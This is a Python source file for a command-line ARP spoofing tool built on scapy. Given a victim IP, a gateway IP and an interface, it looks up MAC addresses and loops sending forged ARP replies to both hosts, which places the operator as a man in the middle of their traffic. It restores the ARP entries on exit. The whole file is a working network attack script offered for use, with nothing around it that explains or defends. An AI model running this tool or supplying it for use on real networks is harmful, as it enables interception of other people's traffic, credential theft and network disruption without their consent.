import scapy.all as sc
from argparse import ArgumentParser
from os import getuid


def takeArguments():
    """
        Takes the commande line arguments and returns it to the main()
    """
    # Object of ArgumentParser() for handling the CLI Aruguments
    parser = ArgumentParser(description="Add the description of this tool here")

    # List of arguments
    parser.add_argument(
        "-v",
        "--victim",
        type=str,
        help="set the IP address of the victim/target.",
        required = True
    )
    parser.add_argument(
        "-r",
        "--router",
        type=str,
        help="set the IP address of the router/gateway.",
        required = True
    )
    parser.add_argument(
        "-i",
        "--interface",
        type=str,
        help="set the interface to start ARP spoofing.",
        required = True
    )

    # Parse and return the arguments
    return parser.parse_args()

def get_mac(ip):
    """
        This function returns the MAC address of the IP address
    """

    brodcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff") / sc.ARP(pdst = ip)
    
    reply = sc.srp(brodcast, timeout = 1, verbose = False)[0]
    mac = reply[0][1].hwsrc

    if mac == None:
        exit(f"[!] Unable to find the MAC address of the {ip}\n[!] Exiting...")

    return mac

def spoof(target_ip, spoof_ip, interface):
    """
        It will send the fake ARP packets to the victim/target and router
    """

    packet = sc.ARP(
        op = 2, 
        pdst = target_ip,
        hwdst = get_mac(target_ip),
        psrc = spoof_ip
    )

    try: 
        sc.send(packet, interface, verbose = False)
        # print(f"[*] Spoofed packet sent to {target_ip}")
    
    except Exception as e:
        print(f"Error: {e}")
        exit("[!] Unable to send the spoofed packet!")

def restore(original_ip, spoofed_ip, interface):
    """
        It will restore the original MAC for the victim IP on ARP table
    """

    packet = sc.ARP(
        op = 2, 
        pdst = original_ip,
        hwdst = get_mac(original_ip),
        psrc = spoofed_ip,
        hwsrc = get_mac(spoofed_ip)
    )

    try: 
        sc.send(packet, interface, verbose = False)
    
    except Exception as e:
        print(f"Error: {e}")
        exit("[!] Unable to send the restore packet!")

def main(args):
    # if(getuid() != 0):
    #     exit("[!] Run this script as a root!!!\n[!] Exiting...")

    sentPackets = 0

    try:
        print("Sending fake ARP packets to the target and router...")

        print(type(args.victim), args.victim)
        print(type(args.router), args.router)
        print(type(args.interface), args.interface)

        while True:
            spoof(args.victim, args.router, args.interface)
            spoof(args.router, args.victim, args.interface)
            sentPackets += 2
            print(f"{args.victim} ---> You ---> {args.router} \t Total: {sentPackets}")

    except KeyboardInterrupt:
        print("[!] Keyboard Interupt:")
        print(f"Total spoofed packet sent: {sentPackets}")

    except Exception as e:
        print(f"Error: {e}")
        exit("[!] Unable to send the packet!")

    finally:
        restore(args.victim, args.router, args.interface)
        restore(args.router, args.victim, args.interface)
        exit("Exiting...")

main(takeArguments())